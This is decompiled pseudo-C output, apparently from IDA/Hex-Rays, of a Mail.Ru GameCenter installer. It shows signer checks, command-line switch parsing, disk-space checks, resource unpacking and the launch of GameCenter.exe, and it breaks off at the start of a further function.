_DWORD *sub_45D210()
{
  int *v0; // eax
  char v1; // zf
  int *v2; // eax
  BOOL *v4; // [esp-38h] [ebp-44h]
  BOOL *v5; // [esp-38h] [ebp-44h]
  __int64 v6; // [esp-14h] [ebp-20h]
  unsigned int v7[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v8; // [esp-4h] [ebp-10h]
  BOOL *v9; // [esp+0h] [ebp-Ch] BYREF
  LONG v10; // [esp+4h] [ebp-8h]
  BOOL *v11; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_45D2F4;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_426040(0, (int *)&v11);
  v10 = sub_451240((int)v11);
  if ( v10 )
  {
    v6 = v10;
    v4 = v11;
    v0 = (int *)sub_4582B0();
    sub_4521B0(v0, 1014, (__int32)&dword_46F6D4, v6, 0i64, 0i64, 0i64, 0i64, v4);
  }
  else
  {
    sub_4512D0((int)v11, &v9);
    sub_407AA0((int)v9, (int)L"Mail.Ru, LLC");
    if ( !v1 )
    {
      sub_407AA0((int)v9, (int)L"My.com B.V.");
      if ( !v1 )
      {
        sub_407AA0((int)v9, (int)L"Mail.Ru LLC");
        if ( !v1 )
        {
          v5 = v9;
          v2 = (int *)sub_4582B0();
          sub_4521B0(v2, 1015, (__int32)&dword_46F6D4, 0i64, 0i64, 0i64, 0i64, 0i64, v5);
        }
      }
    }
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_45D2FB;
  sub_406C44(&v9);
  return sub_406C44(&v11);
}
// 45D28A: variable 'v1' is possibly undefined
// 45D30C: using guessed type wchar_t aMailRuLlc[13];
// 45D334: using guessed type wchar_t aMyComBV[12];
// 45D358: using guessed type wchar_t aMailRuLlc_0[12];
// 46F6D4: using guessed type int dword_46F6D4;

//----- (0045D370) --------------------------------------------------------
int __usercall sub_45D370@<eax>(DWORD a1@<ebx>, _DWORD **a2@<edi>, int a3@<esi>, long double a4@<st0>)
{
  int v4; // eax
  char v5; // zf
  __int32 v6; // ecx
  int v7; // eax
  int *v8; // eax
  void *v9; // eax
  int *v10; // eax
  void *v11; // eax
  const WCHAR *v12; // eax
  int v13; // ecx
  DWORD HighPart; // edx
  int v15; // edx
  int v16; // ecx
  int *v17; // eax
  int v18; // eax
  __int64 v19; // rax
  __int32 v20; // ecx
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // eax
  unsigned int v26[2]; // [esp-4Ch] [ebp-1C0h] BYREF
  __int64 QuadPart; // [esp-44h] [ebp-1B8h]
  ULARGE_INTEGER v28; // [esp-3Ch] [ebp-1B0h]
  wchar_t *v29; // [esp-34h] [ebp-1A8h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-30h] [ebp-1A4h] BYREF
  void *v31; // [esp-2Ch] [ebp-1A0h]
  volatile __int32 *v32; // [esp-28h] [ebp-19Ch]
  int v33; // [esp-24h] [ebp-198h]
  const wchar_t *v34; // [esp-20h] [ebp-194h]
  int *v35; // [esp-1Ch] [ebp-190h]
  int v36; // [esp-18h] [ebp-18Ch]
  const wchar_t *v37; // [esp-14h] [ebp-188h]
  int *v38; // [esp-10h] [ebp-184h]
  unsigned int v39[2]; // [esp-Ch] [ebp-180h] BYREF
  int *v40; // [esp-4h] [ebp-178h]
  int v41; // [esp+Ch] [ebp-168h] BYREF
  int v42; // [esp+10h] [ebp-164h] BYREF
  void *v43; // [esp+14h] [ebp-160h] BYREF
  int v44; // [esp+18h] [ebp-15Ch] BYREF
  __int32 v45; // [esp+1Ch] [ebp-158h] BYREF
  int v46; // [esp+20h] [ebp-154h] BYREF
  int v47; // [esp+24h] [ebp-150h] BYREF
  __int32 v48; // [esp+28h] [ebp-14Ch] BYREF
  int v49; // [esp+2Ch] [ebp-148h] BYREF
  int v50; // [esp+30h] [ebp-144h] BYREF
  int v51; // [esp+34h] [ebp-140h] BYREF
  __int32 v52; // [esp+38h] [ebp-13Ch] BYREF
  __int32 v53; // [esp+3Ch] [ebp-138h] BYREF
  DWORD v54; // [esp+40h] [ebp-134h] BYREF
  int v55; // [esp+44h] [ebp-130h] BYREF
  int v56; // [esp+48h] [ebp-12Ch] BYREF
  int v57; // [esp+4Ch] [ebp-128h] BYREF
  int v58; // [esp+50h] [ebp-124h] BYREF
  int v59; // [esp+54h] [ebp-120h] BYREF
  char v60; // [esp+58h] [ebp-11Ch]
  int v61; // [esp+5Ch] [ebp-118h]
  char v62; // [esp+60h] [ebp-114h]
  DWORD v63; // [esp+64h] [ebp-110h] BYREF
  wchar_t *v64; // [esp+68h] [ebp-10Ch] BYREF
  void *v65; // [esp+6Ch] [ebp-108h] BYREF
  int v66; // [esp+70h] [ebp-104h] BYREF
  int v67; // [esp+74h] [ebp-100h] BYREF
  void *v68; // [esp+78h] [ebp-FCh] BYREF
  __int32 v69; // [esp+7Ch] [ebp-F8h] BYREF
  int v70; // [esp+80h] [ebp-F4h] BYREF
  void *v71; // [esp+84h] [ebp-F0h] BYREF
  char v72; // [esp+88h] [ebp-ECh]
  void *v73; // [esp+8Ch] [ebp-E8h] BYREF
  int v74; // [esp+90h] [ebp-E4h] BYREF
  void *v75; // [esp+94h] [ebp-E0h] BYREF
  void *v76; // [esp+98h] [ebp-DCh] BYREF
  int v77; // [esp+9Ch] [ebp-D8h] BYREF
  int v78; // [esp+A0h] [ebp-D4h] BYREF
  int v79; // [esp+A4h] [ebp-D0h] BYREF
  __int32 v80; // [esp+A8h] [ebp-CCh] BYREF
  __int32 v81; // [esp+ACh] [ebp-C8h] BYREF
  void *v82; // [esp+B0h] [ebp-C4h] BYREF
  int v83; // [esp+B4h] [ebp-C0h] BYREF
  __int32 v84; // [esp+B8h] [ebp-BCh] BYREF
  void *v85; // [esp+BCh] [ebp-B8h] BYREF
  int v86; // [esp+C0h] [ebp-B4h] BYREF
  __int32 v87; // [esp+C4h] [ebp-B0h] BYREF
  __int32 v88; // [esp+C8h] [ebp-ACh] BYREF
  int v89; // [esp+CCh] [ebp-A8h] BYREF
  int v90; // [esp+D0h] [ebp-A4h] BYREF
  int v91; // [esp+D4h] [ebp-A0h] BYREF
  int v92; // [esp+D8h] [ebp-9Ch] BYREF
  int v93; // [esp+DCh] [ebp-98h] BYREF
  __int32 v94; // [esp+E0h] [ebp-94h] BYREF
  int v95; // [esp+E4h] [ebp-90h] BYREF
  int cchCount1; // [esp+E8h] [ebp-8Ch] BYREF
  __int32 v97; // [esp+ECh] [ebp-88h] BYREF
  __int32 v98[11]; // [esp+F0h] [ebp-84h] BYREF
  char v99; // [esp+11Dh] [ebp-57h]
  int v100; // [esp+134h] [ebp-40h]
  bool v101; // [esp+13Bh] [ebp-39h]
  DWORD cchLength; // [esp+13Ch] [ebp-38h] BYREF
  unsigned __int8 v103; // [esp+143h] [ebp-31h] BYREF
  unsigned __int32 v104; // [esp+144h] [ebp-30h] BYREF
  int v105; // [esp+148h] [ebp-2Ch] BYREF
  int v106; // [esp+14Ch] [ebp-28h] BYREF
  Classes::TStream *v107; // [esp+150h] [ebp-24h] BYREF
  __int64 v108; // [esp+154h] [ebp-20h]
  ULARGE_INTEGER TotalNumberOfBytes; // [esp+15Ch] [ebp-18h] BYREF
  ULARGE_INTEGER FreeBytesAvailableToCaller; // [esp+164h] [ebp-10h] BYREF
  int i; // [esp+170h] [ebp-4h]
  int savedregs; // [esp+174h] [ebp+0h] BYREF

  sub_407D10((int)&v97, (int)&byte_423524);
  v40 = &savedregs;
  v39[1] = (unsigned int)&loc_45E192;
  v39[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v39);
  SetErrorMode(0x8001u);
  if ( !sub_45C460() )
  {
    sub_406C44(&dword_46F6FC);
    sub_406C44(&cchLength);
    v4 = sub_425FD0();
    if ( v4 <= 0 )
    {
LABEL_17:
      sub_45BB20(a1, (int)a2, a3);
      sub_45BD30(v6, (int)a2);
      sub_45AFD0((int)off_467E64[0], &v94, (int)a2);
      sub_407AA0(v94, (int)dword_45E310);
      if ( v5 )
        byte_467E7E = 1;
      if ( byte_467E7F )
        byte_467E7E = 0;
      if ( !dword_46F6FC )
        sub_406FE8(&dword_46F6FC, (int)L"-startedbysetup");
      v38 = &v93;
      v37 = L"\"installer=";
      sub_426040(0, &v91);
      v36 = v91;
      sub_4079F0(&v92, 3);
      sub_424890(dword_46F6FC, v92, (int)&str___22[1], dword_45E370);
      sub_406FE8(&dword_46F6FC, v93);
      if ( dword_46F6E0 )
      {
        v35 = &v90;
        v34 = L"\"-p1link=";
        v33 = dword_46F6E0;
        sub_4079F0(&v89, 3);
        sub_424890(dword_46F6FC, v89, (int)&str___22[1], dword_45E370);
        sub_406FE8(&dword_46F6FC, v90);
      }
      sub_45AFD0((int)L"SteamInstallerSpecial", &v88, (int)a2);
      if ( v88 )
      {
        sub_45AFD0((int)L"SteamInstallerSpecial", (volatile __int32 *)&v85, (int)a2);
        sub_407968(&v86, L"-SteamInstallerSpecial=", v85);
        sub_424890(dword_46F6FC, v86, (int)&str___22[1], &v87);
        sub_406FE8(&dword_46F6FC, v87);
      }
      if ( dword_46F6D0 )
      {
        sub_451A90(&dword_46F6D4, (int *)&v82);
        sub_407968(&v83, L"game=", v82);
        sub_424890(dword_46F6FC, v83, (int)&str___22[1], &v84);
        sub_406FE8(&dword_46F6FC, v84);
      }
      v7 = sub_425FD0();
      if ( v7 > 0 )
      {
        v100 = v7;
        i = 1;
        do
        {
          sub_426040(i, &v79);
          sub_423AF0(v79, &v80, a1, a3);
          sub_424890(dword_46F6FC, v80, (int)&str___22[1], &v81);
          sub_406FE8(&dword_46F6FC, v81);
          ++i;
          --v100;
        }
        while ( v100 );
      }
      sub_45C3F0(a2);
      if ( sub_45D0C0(a1, (int)a2, a3, a4) )
      {
        sub_425600((int)dword_46F6F8, a1, a3);
        sub_407968(&v78, dword_46F6F8, L"main.log");
        sub_432FA0(*off_467F18, v78);
        sub_45BFA0((volatile __int32 *)&v76, a1, a3);
        sub_407968(&v77, L"GameCenter installer started: ", v76);
        sub_433BE0(*off_467F18, v77, 0);
        sub_426A60((int)L"GameCenter.exe", (int *)&v75);
        if ( (sub_456C00(v75, (int)a2) != 2 || !sub_425ED0(3u, 0)
                                            || !sub_44E3B0()
                                            || sub_44E310()
                                            || !sub_45CB20(a1, a3))
          && (sub_456C00(L"HG64.exe", (int)a2) != 2
           || !sub_425ED0(3u, 0)
           || !sub_44E3B0()
           || sub_44E310()
           || !sub_45CB20(a1, a3)) )
        {
          if ( byte_467E7C )
          {
            sub_407AA0(cchLength, (int)*off_468040);
            if ( v5 )
            {
              v103 = sub_44B4B0(1, 0);
              if ( !v103 )
                v103 = 1;
              sub_407030((volatile __int32 *)&cchLength, (__int32)off_467F84[v103]);
            }
          }
          if ( cchLength && (unsigned __int8)sub_451900(cchLength, &v103) )
          {
            sub_407968(&v74, L"Language changed: ", (_DWORD *)cchLength);
            sub_433BE0(*off_467F18, v74, 0);
          }
          else
          {
            v103 = sub_45BA80((int)a2);
          }
          sub_4518F0(v103);
          if ( sub_45C1A0(byte_467E7E) )
          {
            sub_45D210();
            if ( (unsigned __int8)sub_426C90((int)dword_46F6F8) )
            {
              sub_4252A0((int)dword_46F6F8, &v69);
              if ( !(unsigned __int8)sub_426B00(v69) && sub_423E00((int)dword_46F6F8, 3, a1) )
              {
                FreeBytesAvailableToCaller.QuadPart = 0i64;
                TotalNumberOfBytes.QuadPart = 0i64;
                v12 = (const WCHAR *)sub_407790((int)dword_46F6F8);
                GetDiskFreeSpaceExW(v12, &FreeBytesAvailableToCaller, &TotalNumberOfBytes, 0);
                HighPart = FreeBytesAvailableToCaller.HighPart;
                if ( (__int64)FreeBytesAvailableToCaller.QuadPart >= qword_467E80 )
                {
                  LOBYTE(HighPart) = 1;
                  v107 = (Classes::TStream *)Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(
                                               &cls_CrossPlatform_TResourceStream,
                                               HighPart,
                                               hModule,
                                               L"brs",
                                               10);
                  v32 = &savedregs;
                  v31 = &loc_45DDF2;
                  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
                  __writefsdword(0, (unsigned int)&ExceptionList);
                  v106 = 0;
                  LODWORD(v19) = (**(int (__fastcall ***)(Classes::TStream *))v107)(v107);
                  if ( v19 > 0 )
                  {
                    sub_45A200((int)v107, (int)&v55, (int)a2);
                    sub_4275A0((int)v107, (int)&v106, 4, (int)a2);
                    v108 = sub_427470(v107);
                    if ( v106 - 1 >= 0 )
                    {
                      v100 = v106;
                      i = 0;
                      do
                      {
                        LOBYTE(v20) = 1;
                        sub_45A790((int *)v107, 0, v20, a1, (int)a2, a3, a4);
                        ++i;
                        --v100;
                      }
                      while ( v100 );
                    }
                    Classes::TStream::SetPosition(v107, v108);
                  }
                  if ( sub_45B4C0(a2, a3, a4) )
                  {
                    if ( !sub_45B1A0() )
                    {
                      for ( i = 0; i != 23; ++i )
                        sub_45A630(off_467F78[i], 0, (int)a2, a3, a4);
                    }
                  }
                  else
                  {
                    sub_425600((int)dword_46F6F8, a1, a3);
                    for ( i = 0; i != 23; ++i )
                      sub_45A630(off_467F78[i], 1, (int)a2, a3, a4);
                    v21 = sub_45A980(a2);
                    sub_43F210(v21, (int)L"UMS", (int)a2, a3);
                    v29 = (wchar_t *)sub_45C840(a2);
                    sub_45AA00((volatile __int32 *)&v54);
                    v28.HighPart = v54;
                    v22 = sub_45A980(a2);
                    Inifiles::TCustomIniFile::WriteInteger(v22, (DWORD)L"UMS", v28.HighPart, v29);
                  }
                  if ( byte_467E7D )
                  {
                    sub_433BE0(*off_467F18, (int)L"AlreadyRunning", 0);
                    System::__linkproc__ TryFinallyExit(ExceptionList, v31, v32);
                  }
                  else
                  {
                    sub_45AC90(a2, a3);
                    if ( byte_467E7F )
                    {
                      sub_45A980(a2);
                      if ( (unsigned __int8)Registry::TRegIniFile::ReadBool(0) )
                      {
                        v23 = sub_45A980(a2);
                        sub_43F0C0(v23, ::cchLength, (int)L"SilentInstall", a3);
                      }
                    }
                    if ( cchLength )
                    {
                      v29 = off_467F84[v103];
                      v24 = sub_45A980(a2);
                      sub_441320(v24, off_467E70, off_467E74, (int)a2, v29);
                    }
                    if ( v106 - 1 >= 0 )
                    {
                      v100 = v106;
                      i = 0;
                      do
                      {
                        sub_45A790((int *)v107, 0, 0, a1, (int)a2, a3, a4);
                        ++i;
                        --v100;
                      }
                      while ( v100 );
                    }
                    __writefsdword(0, (unsigned int)ExceptionList);
                    v32 = (volatile __int32 *)&loc_45DDF9;
                    unknown_libname_94(&v107);
                    unknown_libname_94(&dword_46F6F0);
                    if ( !byte_46F6F4 )
                    {
                      sub_424890(dword_46F6FC, (int)L"-removeifinstallcanceled", (int)&str___22[1], &v53);
                      sub_406FE8(&dword_46F6FC, v53);
                    }
                    if ( byte_46F6F5 )
                    {
                      sub_424890(dword_46F6FC, (int)L"-noshortcuts", (int)&str___22[1], &v52);
                      sub_406FE8(&dword_46F6FC, v52);
                    }
                    if ( dword_46F6DC )
                    {
                      v32 = &v51;
                      sub_407968(&v50, L"-channel=", dword_46F6DC);
                      sub_424890(dword_46F6FC, v50, (int)&str___22[1], v32);
                      sub_406FE8(&dword_46F6FC, v51);
                    }
                    if ( dword_46F6E4 )
                    {
                      v32 = &v49;
                      sub_407968(&v47, L"n_launcher_rel=", dword_46F6E4);
                      sub_423AF0(v47, &v48, a1, a3);
                      sub_424890(dword_46F6FC, v48, (int)&str___22[1], v32);
                      sub_406FE8(&dword_46F6FC, v49);
                    }
                    if ( dword_46F6E8 )
                    {
                      v32 = &v46;
                      sub_407968(&v44, L"n_root_rel=", dword_46F6E8);
                      sub_423AF0(v44, &v45, a1, a3);
                      sub_424890(dword_46F6FC, v45, (int)&str___22[1], v32);
                      sub_406FE8(&dword_46F6FC, v46);
                    }
                    v32 = dword_45E370;
                    sub_44D910((int)dword_46F6F8, (int)&v43);
                    v31 = v43;
                    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)dword_45E370;
                    sub_4079F0((int *)&v104, 3);
                    v29 = L"Start GameCenter: ";
                    v28.HighPart = v104;
                    v28.LowPart = (DWORD)&str___22[1];
                    HIDWORD(QuadPart) = dword_46F6FC;
                    sub_4079F0(&v42, 4);
                    sub_433BE0(*off_467F18, v42, 0);
                    if ( byte_46F6F6 )
                    {
                      sub_433BE0(*off_467F18, (int)L"GameCenter start canceled.", 0);
                    }
                    else
                    {
                      LODWORD(QuadPart) = &savedregs;
                      v26[1] = (unsigned int)&loc_45E029;
                      v26[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
                      __writefsdword(0, (unsigned int)v26);
                      v101 = (unsigned int)sub_441AD0((int)L"open", v104, dword_46F6FC, 0, 1) >= 0x20;
                      __writefsdword(0, v26[0]);
                      if ( !v101 )
                      {
                        sub_433940(
                          *off_467F18,
                          L"ShellExecute failed. Trying to use CreateProcess...",
                          0,
                          (int)a2,
                          a3,
                          a4,
                          0);
                        sub_428C20((int)&v97);
                        v98[1] = 0;
                        sub_407030(&v97, v104);
                        sub_407030(v98, dword_46F6FC);
                        v99 = 1;
                        if ( !(unsigned __int8)sub_426210((int)&v97, a1) )
                          sub_433940(
                            *off_467F18,
                            L"CreateProcess failed. Trying to use CreateProcess...",
                            0,
                            (int)a2,
                            a3,
                            a4,
                            0);
                      }
                    }
                  }
                }
                else
                {
                  v32 = (volatile __int32 *)L"Not enough space for install: total=";
                  sub_415178((int *)&v65, FreeBytesAvailableToCaller.HighPart, v13, TotalNumberOfBytes.QuadPart);
                  v31 = v65;
                  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)L" free=";
                  sub_415178((int *)&v64, v15, v16, FreeBytesAvailableToCaller.QuadPart);
                  v29 = v64;
                  sub_4079F0(&v66, 4);
                  sub_433BE0(*off_467F18, v66, 0);
                  v28 = FreeBytesAvailableToCaller;
                  QuadPart = TotalNumberOfBytes.QuadPart;
                  v17 = (int *)sub_4582B0();
                  sub_4521B0(v17, 509, (__int32)&dword_46F6D4, v28.QuadPart, QuadPart, 0i64, 0i64, 0i64, 0);
                  if ( !byte_467E7E )
                  {
                    sub_426940((int)dword_46F6F8, &v58);
                    v59 = v58;
                    v60 = 17;
                    sub_424C50(0, 0, &v57, a1, a3, qword_467E80);
                    v18 = v57;
                    v61 = v57;
                    v62 = 17;
                    LOBYTE(v18) = 1;
                    sub_4516E0(v18, (int)&v59, 1, (volatile __int32 *)&v63);
                    v28.LowPart = v63;
                    sub_45A110(&v56);
                    sub_441B80(0, v28.LowPart, v56, 0x10u);
                  }
                  *off_467E9C = 1;
                }
              }
              else
              {
                v10 = (int *)sub_4582B0();
                sub_4521B0(v10, 506, (__int32)&dword_46F6D4, 2i64, 0i64, 0i64, 0i64, 0i64, 0);
                if ( !byte_467E7E )
                {
                  v11 = dword_46F6F8;
                  v71 = dword_46F6F8;
                  v72 = 17;
                  LOBYTE(v11) = 43;
                  sub_4516E0((int)v11, (int)&v71, 0, (volatile __int32 *)&v68);
                  v31 = v68;
                  sub_45A110(&v67);
                  sub_441B80(0, (int)v31, v67, 0x10u);
                }
                *off_467E9C = 1;
              }
            }
            else
            {
              v8 = (int *)sub_4582B0();
              sub_4521B0(v8, 506, (__int32)&dword_46F6D4, 1i64, 0i64, 0i64, 0i64, 0i64, 0);
              if ( !byte_467E7E )
              {
                v9 = dword_46F6F8;
                v71 = dword_46F6F8;
                v72 = 17;
                LOBYTE(v9) = 44;
                sub_4516E0((int)v9, (int)&v71, 0, (volatile __int32 *)&v73);
                v31 = v73;
                sub_45A110(&v70);
                sub_441B80(0, (int)v31, v70, 0x10u);
              }
              *off_467E9C = 1;
            }
          }
          else
          {
            *off_467E9C = 1;
          }
        }
      }
      else
      {
        *off_467E9C = 1;
      }
    }
    else
    {
      v100 = v4;
      i = 1;
      while ( 1 )
      {
        sub_426040(i, &v105);
        sub_407AA0(v105, (int)L"test-installer-start-test-installer-start");
        if ( v5 )
          break;
        sub_407AA0(v105, (int)L"-dontstartgc");
        if ( v5 )
        {
          byte_46F6F6 = 1;
        }
        else
        {
          sub_407AA0(v105, (int)L"-silentinstall");
          if ( v5 )
          {
            sub_406FE8(&dword_46F6FC, v105);
            byte_467E7E = 1;
          }
          else
          {
            sub_407AA0(v105, (int)L"-nonsilentinstall");
            if ( v5 )
            {
              byte_467E7F = 1;
            }
            else
            {
              sub_407AA0(v105, (int)L"-noshortcuts");
              if ( v5 )
              {
                byte_46F6F5 = 1;
              }
              else
              {
                sub_407AD8(v105, 1, 6, &cchCount1);
                if ( !sub_426AB0(cchCount1, (int)L"-lang=") )
                {
                  sub_407030((volatile __int32 *)&cchLength, v105);
                  sub_407B20((volatile __int32 *)&cchLength, 1, 6);
                  sub_426A60(cchLength, &v95);
                  sub_407030((volatile __int32 *)&cchLength, v95);
                }
              }
            }
          }
        }
        ++i;
        if ( !--v100 )
          goto LABEL_17;
      }
      sub_433BE0(*off_467F18, (int)L"InstallerStartCheck=OK", 0);
      *off_467E9C = 201;
    }
  }
  __writefsdword(0, v39[0]);
  v40 = (int *)&loc_45E199;
  sub_406CA4((int)&v41, 14);
  sub_406C68(&v55);
  sub_406CA4((int)&v56, 3);
  sub_406CA4((int)&v63, 8);
  sub_406CA4((int)&v73, 24);
  sub_407DEC((int)&v97, (int)&byte_423524);
  sub_406C44(&cchLength);
  return sub_406CA4((int)&v104, 2);
}
// 45D3F9: variable 'v5' is possibly undefined
// 45D508: variable 'v6' is possibly undefined
// 45DAC6: variable 'v13' is possibly undefined
// 45DAE2: variable 'v15' is possibly undefined
// 45DAE2: variable 'v16' is possibly undefined
// 45DC26: variable 'v19' is possibly undefined
// 45DC72: variable 'v20' is possibly undefined
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);
// 42286C: using guessed type int (*cls_CrossPlatform_TResourceStream)();
// 423524: using guessed type char byte_423524;
// 427C00: using guessed type _DWORD __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, HMODULE hModule, _DWORD, _DWORD);
// 43FE40: using guessed type _DWORD __stdcall Registry::TRegIniFile::ReadBool(char);
// 4410B0: using guessed type _DWORD __fastcall Inifiles::TCustomIniFile::WriteInteger(_DWORD, DWORD cchLength, DWORD, _DWORD);
// 45E1AC: using guessed type wchar_t aTestInstallerS[42];
// 45E20C: using guessed type wchar_t aInstallerstart[23];
// 45E248: using guessed type wchar_t aDontstartgc[13];
// 45E270: using guessed type wchar_t aSilentinstall[15];
// 45E29C: using guessed type wchar_t aNonsilentinsta[18];
// 45E2CC: using guessed type wchar_t aNoshortcuts[13];
// 45E2F4: using guessed type wchar_t aLang[7];
// 45E310: using guessed type int dword_45E310[4];
// 45E320: using guessed type wchar_t aStartedbysetup[16];
// 45E34C: using guessed type wchar_t aInstaller_5[12];
// 45E370: using guessed type int dword_45E370[2];
// 45E378: using guessed type _strings str___22[1];
// 45E390: using guessed type wchar_t aP1link_0[10];
// 45E3B0: using guessed type wchar_t aSteaminstaller[22];
// 45E3E8: using guessed type wchar_t aSteaminstaller_0[24];
// 45E424: using guessed type wchar_t aGame[6];
// 45E43C: using guessed type wchar_t aMainLog[9];
// 45E45C: using guessed type wchar_t aGamecenterInst[31];
// 45E4A8: using guessed type wchar_t aGamecenterExe_0[15];
// 45E4D4: using guessed type wchar_t aHg64Exe[9];
// 45E4F4: using guessed type wchar_t aLanguageChange[19];
// 45E52C: using guessed type wchar_t aNotEnoughSpace[37];
// 45E584: using guessed type wchar_t aFree[7];
// 45E5A0: using guessed type wchar_t aBrs_0[4];
// 45E5B4: using guessed type wchar_t aUms_1[4];
// 45E5C8: using guessed type wchar_t aAlreadyrunning[15];
// 45E5F4: using guessed type wchar_t aSilentinstall_0[14];
// 45E61C: using guessed type wchar_t aRemoveifinstal[25];
// 45E65C: using guessed type wchar_t aChannel[10];
// 45E67C: using guessed type wchar_t aNLauncherRel_0[16];
// 45E6A8: using guessed type wchar_t aNRootRel_0[12];
// 45E6CC: using guessed type wchar_t aStartGamecente[19];
// 45E700: using guessed type wchar_t aGamecenterStar[27];
// 45E744: using guessed type wchar_t aOpen_0[5];
// 45E7C8: using guessed type wchar_t aShellexecuteFa[52];
// 45E83C: using guessed type wchar_t aCreateprocessF[53];
// 467E64: using guessed type wchar_t *off_467E64[6];
// 467E7C: using guessed type char byte_467E7C;
// 467E7D: using guessed type char byte_467E7D;
// 467E7E: using guessed type char byte_467E7E;
// 467E7F: using guessed type char byte_467E7F;
// 467E80: using guessed type __int64 qword_467E80;
// 467E9C: using guessed type int *off_467E9C;
// 467F18: using guessed type int *off_467F18;
// 467F78: using guessed type wchar_t **off_467F78;
// 467F84: using guessed type wchar_t **off_467F84;
// 468040: using guessed type wchar_t **off_468040;
// 46F6D0: using guessed type int dword_46F6D0;
// 46F6D4: using guessed type int dword_46F6D4;
// 46F6E0: using guessed type int dword_46F6E0;
// 46F6F0: using guessed type int dword_46F6F0;
// 46F6F4: using guessed type char byte_46F6F4;
// 46F6F5: using guessed type char byte_46F6F5;
// 46F6F6: using guessed type char byte_46F6F6;
// 46F6FC: using guessed type int dword_46F6FC;

//----- (0045E8B0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_45E8B0@<eax>(DWORD a1@<ebx>, _DWORD **a2@<edi>, int a3@<esi>, long double a4@<st0>)
{
  unsigned int v5[3]; // [esp-3Ch] [ebp-48h] BYREF
  unsigned int v6[2]; // [esp-30h] [ebp-3Ch] BYREF
  void **v7; // [esp-28h] [ebp-34h]
  _DWORD v8[3]; // [esp-24h] [ebp-30h] BYREF
  _DWORD v9[6]; // [esp-18h] [ebp-24h] BYREF
  int v10; // [esp+0h] [ebp-Ch] BYREF
  int v11; // [esp+4h] [ebp-8h]
  int v12; // [esp+8h] [ebp-4h]
  void *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9[5] = a1;
  v9[4] = a3;
  v9[3] = a2;
  v9[2] = &savedregs;
  v9[1] = &loc_45EA35;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  sub_42A200(2, 1569, 53606);
  sub_433040((int)&cls_DownloaderSetupBody_TInstallerDebug, 1, 0, 1, 0);
  v8[2] = &savedregs;
  v8[1] = &loc_45EA13;
  v8[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_4581A0();
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_45E9F4;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_433BE0(*off_467F18, (int)L"Start", 0);
  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_45E941;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_45D370(a1, a2, a3, a4);
  __writefsdword(0, v5[0]);
  __writefsdword(0, v6[0]);
  v7 = (void **)&loc_45E9FB;
  sub_458220(a1, (int)a2, a3);
  __writefsdword(0, v11);
  savedregs = &loc_45EA1A;
  unknown_libname_94(off_467F18);
  __writefsdword(0, v11);
  savedregs = &loc_45EA3C;
  return sub_406CA4((int)&v10, 2);
}
// 45E8B0: could not find valid save-restore pair for ebx
// 45E8B0: could not find valid save-restore pair for edi
// 45E8B0: could not find valid save-restore pair for esi
// 45EA2F: bad sp value at call
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);
// 45A094: using guessed type int (__stdcall *cls_DownloaderSetupBody_TInstallerDebug)(int, int, int);
// 45EA50: using guessed type wchar_t aStart[6];
// 467F18: using guessed type int *off_467F18;

//----- (0045EA60) --------------------------------------------------------
_DWORD *__fastcall sub_45EA60(int a1, char a2, void *a3, int a4, int a5, BOOL *a6)
{
  unsigned int v7[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v8; // [esp-4h] [ebp-18h]
  void *v9[2]; // [esp+4h] [ebp-10h] BYREF
  char v10; // [esp+Fh] [ebp-5h]
  int v11; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v9[0] = 0;
  v9[1] = a3;
  v10 = a2;
  v11 = a1;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_45EAEC;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_4341F0((int)a6, a5, a4);
  if ( (unsigned __int8)(v10 - 3) < 3u )
  {
    if ( *(_DWORD *)(v11 + 48) )
      sub_4072D4((volatile __int32 *)(v11 + 48), sub_45EB08);
    sub_40B238(a6, (volatile __int32 *)v9);
    sub_4072D4((volatile __int32 *)(v11 + 48), (_DWORD *)v9[0]);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_45EAF3;
  return sub_406C68(v9);
}
// 45EB08: using guessed type int sub_45EB08();

//----- (0045EB10) --------------------------------------------------------
_DWORD *__usercall sub_45EB10@<eax>(
        int *a1@<eax>,
        char a2@<dl>,
        __int32 a3@<ecx>,
        int a4@<edi>,
        int a5@<esi>,
        long double a6@<st0>)
{
  int v6; // edx
  int v7; // eax
  int v8; // ecx
  DWORD v9; // eax
  int v10; // ecx
